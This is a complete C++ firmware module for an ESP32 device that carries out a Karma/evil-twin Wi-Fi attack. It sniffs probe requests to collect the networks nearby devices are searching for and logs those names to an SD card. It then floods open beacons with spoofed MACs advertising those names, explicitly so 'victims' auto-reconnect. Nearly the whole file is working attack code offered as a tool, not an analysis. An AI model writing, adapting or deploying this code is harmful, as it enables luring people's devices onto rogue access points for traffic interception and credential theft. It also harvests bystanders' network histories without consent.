// ===================================================================
// bySaw Karma / Evil-Twin beacon flood
//
// Two phases:
//   1) HARVEST  — promiscuous MODE_NULL, channel-hop 2.4GHz, capture probe
//                 requests and collect the unique SSIDs nearby devices are
//                 actively searching for (their saved/preferred networks).
//   2) KARMA    — switch to AP mode and beacon-flood *exactly those* SSIDs
//                 across all channels, so each victim sees "their" network
//                 appear and may auto-reconnect. This is the Karma idea:
//                 advertise what devices ask for (vs the stock Beacon Spammer
//                 which floods random garbage names).
//
// Reuses the proven Pwnagotchi/ProbeSniffer sniffer pattern: never touch SD in
// the Wi-Fi callback — copy hits into a queue and drain on the main task.
// Logs harvested SSIDs to /karma/karma-*.csv. SELECT exits.
// (Inspired by Bruce / Evil-Cardputer Karma + evil-twin tooling.)
// ===================================================================
#include "config.h"
#include "shared.h"
#include "KarmaAttack.h"
#include <SD.h>
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"

extern TFT_eSPI tft;
extern bool feature_active;
extern bool feature_exit_requested;
bool featureExitButtonPressed();

namespace KarmaAttack {

struct SsidHit { uint8_t len; char ssid[33]; };

static QueueHandle_t s_q = nullptr;
static volatile bool s_paused = false;
static volatile uint32_t s_probes = 0;
static uint8_t s_channel = 1;

static const int MAXS = 32;
static char s_ssids[MAXS][33];
static int  s_ssidLen[MAXS];
static int  s_count = 0;

static File s_csv;
static bool s_csvOpen = false;

static uint8_t s_beacon[128];

// Fallback set so the flood still does something if no probes are heard.
static const char *kCommon[] = {"FreeWiFi", "xfinitywifi", "Starbucks WiFi",
                                "Guest", "iPhone", "AndroidAP", "TP-LINK"};

// ---- promiscuous probe-request callback (collect requested SSIDs) ----
static void IRAM_ATTR cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (s_paused) return;
  const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *fr = p->payload;
  const int len = p->rx_ctrl.sig_len;
  if (len < 26) return;
  // probe request = mgmt (type 0) subtype 4
  if (((fr[0] >> 2) & 0x3) != 0 || ((fr[0] >> 4) & 0xF) != 4) return;
  if (fr[24] != 0x00) return;            // first tagged param must be SSID
  uint8_t sl = fr[25];
  if (sl == 0 || sl > 32) return;        // skip broadcast (wildcard) probes
  if (len < 26 + sl) return;
  s_probes++;
  SsidHit h;
  h.len = sl;
  memcpy(h.ssid, fr + 26, sl);
  h.ssid[sl] = 0;
  if (s_q) xQueueSend(s_q, &h, 0);
}

static void addSsid(const char *ssid, int len) {
  if (len == 0 || len > 32) return;
  for (int i = 0; i < s_count; i++)
    if (s_ssidLen[i] == len && memcmp(s_ssids[i], ssid, len) == 0) return;
  if (s_count < MAXS) {
    memcpy(s_ssids[s_count], ssid, len);
    s_ssids[s_count][len] = 0;
    s_ssidLen[s_count] = len;
    s_count++;
    if (s_csvOpen) { s_csv.printf("%s\n", ssid); s_csv.flush(); }
  }
}

// ---- build an open beacon frame advertising `ssid` on `channel` ----
static int buildBeacon(const char *ssid, int slen, uint8_t channel) {
  static const uint8_t hdr[10] = {0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  memcpy(s_beacon, hdr, 10);
  for (int i = 10; i < 16; i++) s_beacon[i] = random(256);  // random source MAC
  memcpy(s_beacon + 16, s_beacon + 10, 6);                  // BSSID == source
  s_beacon[22] = 0x00; s_beacon[23] = 0x00;                 // seq/frag
  memset(s_beacon + 24, 0x00, 8);                           // timestamp
  s_beacon[32] = 0x64; s_beacon[33] = 0x00;                 // beacon interval
  s_beacon[34] = 0x01; s_beacon[35] = 0x04;                 // capability (ESS, open)
  int o = 36;
  s_beacon[o++] = 0x00; s_beacon[o++] = (uint8_t)slen;      // SSID tag
  memcpy(s_beacon + o, ssid, slen); o += slen;
  static const uint8_t rates[10] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
  memcpy(s_beacon + o, rates, 10); o += 10;
  s_beacon[o++] = 0x03; s_beacon[o++] = 0x01; s_beacon[o++] = channel;  // DS param
  return o;
}

static void drawHeader(const char *phase, uint16_t col) {
  tft.fillRect(0, 0, tft.width(), 36, UI_BG);
  tft.setTextFont(1);
  tft.setTextColor(UI_ICON, UI_BG);
  tft.setTextSize(2);
  tft.drawCentreString("Karma", tft.width() / 2, 4, 1);
  tft.setTextSize(1);
  tft.setTextColor(col, UI_BG);
  tft.drawCentreString(phase, tft.width() / 2, 24, 1);
}

static void drawList(bool flooding) {
  tft.fillRect(0, 36, tft.width(), tft.height() - 36, UI_BG);
  const int rowH = 16, top = 40;
  const int rows = (tft.height() - top - 16) / rowH;
  int start = s_count > rows ? s_count - rows : 0;
  int y = top;
  for (int i = start; i < s_count; i++) {
    tft.setTextColor(flooding ? UI_WARN : UI_OK, UI_BG);
    tft.setCursor(6, y);
    tft.printf("%s%s", flooding ? "<<" : "", s_ssids[i]);
    y += rowH;
  }
  tft.setTextColor(UI_DIM_TEXT, UI_BG);
  tft.drawCentreString("SEL: exit", tft.width() / 2, tft.height() - 12, 1);
}

void run() {
  feature_active = true;
  setTouchButtonInputEnabled(true);  // enable touch SELECT slot for touch-only exit
  feature_exit_requested = false;
  pauseBackgroundRadioTasks();
  s_probes = 0;
  s_count = 0;
  s_channel = 1;
  s_paused = false;
  s_q = xQueueCreate(24, sizeof(SsidHit));

  tft.fillScreen(UI_BG);
  drawHeader("harvesting probes...", UI_OK);

  if (SD.cardType() != CARD_NONE) {
    SD.mkdir("/karma");
    char path[40];
    snprintf(path, sizeof(path), "/karma/karma-%lu.csv", (unsigned long)(millis() / 1000));
    s_csv = SD.open(path, FILE_WRITE);
    if (s_csv) { s_csvOpen = true; s_csv.print("ssid\n"); Serial.printf("[karma] log %s\n", path); }
  }

  // ---- phase 1: harvest (init WiFi NULL + promiscuous, like ProbeSniffer) ----
  wifi_mode_t wm;
  esp_err_t e_mode = esp_wifi_get_mode(&wm);
  if (e_mode == ESP_ERR_WIFI_NOT_INIT) {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_start();
  }
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

  uint32_t start = millis(), lastHop = 0, lastDraw = 0;
  const uint32_t HARVEST_MS = 8000;
  while (!feature_exit_requested && !featureExitButtonPressed() &&
         (millis() - start) < HARVEST_MS) {
    uint32_t now = millis();
    SsidHit h;
    while (s_q && xQueueReceive(s_q, &h, 0) == pdTRUE) addSsid(h.ssid, h.len);
    if (now - lastHop > 700) {
      s_channel = (s_channel % 13) + 1;
      esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
      lastHop = now;
    }
    if (now - lastDraw > 400) {
      char hd[40];
      snprintf(hd, sizeof(hd), "harvest CH%-2d  %d SSIDs", s_channel, s_count);
      drawHeader(hd, UI_OK);
      drawList(false);
      lastDraw = now;
    }
    delay(10);
  }

  // stop sniffing
  s_paused = true;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  if (s_q) { vQueueDelete(s_q); s_q = nullptr; }

  // exit requested during harvest -> tear down here, don't fall into the flood
  if (feature_exit_requested || featureExitButtonPressed()) {
    esp_wifi_set_mode(WIFI_MODE_STA);
    if (s_csvOpen) { s_csv.flush(); s_csv.close(); s_csvOpen = false; }
    Serial.println("[karma] exit during harvest");
    return;
  }

  // seed with common SSIDs if nothing was heard, so the flood is still useful
  if (s_count == 0) {
    for (size_t i = 0; i < sizeof(kCommon) / sizeof(kCommon[0]); i++)
      addSsid(kCommon[i], strlen(kCommon[i]));
  }
  Serial.printf("[karma] harvested %d SSIDs, probes=%lu -> flooding\n", s_count,
                (unsigned long)s_probes);

  // ---- phase 2: beacon-flood harvested SSIDs in AP mode ----
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);  // required for raw 802.11 tx

  uint8_t floodCh = 1;
  uint32_t lastChDraw = 0, lastLog = 0;
  uint32_t beacons = 0;
  while (!feature_exit_requested && !featureExitButtonPressed()) {
    floodCh = (floodCh % 13) + 1;
    esp_wifi_set_channel(floodCh, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < s_count && !featureExitButtonPressed(); i++) {
      int len = buildBeacon(s_ssids[i], s_ssidLen[i], floodCh);
      esp_wifi_80211_tx(WIFI_IF_AP, s_beacon, len, false);
      esp_wifi_80211_tx(WIFI_IF_AP, s_beacon, len, false);
      beacons += 2;
    }
    uint32_t now = millis();
    if (now - lastChDraw > 300) {
      char hd[40];
      snprintf(hd, sizeof(hd), "FLOOD CH%-2d  %d SSIDs", floodCh, s_count);
      drawHeader(hd, UI_WARN);
      drawList(true);
      lastChDraw = now;
    }
    if (now - lastLog > 3000) {
      Serial.printf("[karma] flooding %d SSIDs ch=%d beacons=%lu heap=%u\n", s_count, floodCh,
                    (unsigned long)beacons, ESP.getFreeHeap());
      lastLog = now;
    }
    delay(2);
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_mode(WIFI_MODE_STA);
  if (s_csvOpen) { s_csv.flush(); s_csv.close(); s_csvOpen = false; }
  Serial.printf("[karma] stopped: %d SSIDs, %lu beacons sent\n", s_count, (unsigned long)beacons);
}

}  // namespace KarmaAttack
